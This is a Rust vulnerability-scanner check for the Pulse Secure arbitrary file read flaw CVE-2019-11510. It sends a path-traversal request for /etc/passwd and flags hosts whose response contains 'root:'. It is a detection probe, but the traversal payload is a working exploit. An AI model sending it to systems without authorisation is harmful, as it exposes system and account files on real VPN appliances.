/* http-vuln-cve2019-11510-4 - Pulse Secure arbitrary file read probe. */
#![allow(dead_code)]
mod arsenal;
use arsenal::*;

#[no_mangle]
pub extern "C" fn almap_script_run(ctx: *mut AlScriptContext) -> i32 {
let port = unsafe { (*ctx).port };
let mut resp = String::new();
resp = match http_request(ctx, "GET", "/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd", None, "", "", None, 8192) {
    Some(r) if !r.is_empty() => r,
    _ => { set_out(ctx, "http-vuln-cve2019-11510-4: no HTTP response"); return 0; }
};
if contains_ci(&resp, "root:") {
    set_out(ctx, &format!("VULNERABLE: /dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd [{}] (CVE-2019-11510)", http_status(&resp)));
} else {
    set_out(ctx, &format!("not vulnerable: CVE-2019-11510 (/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd [{}])", http_status(&resp)));
}
0
}
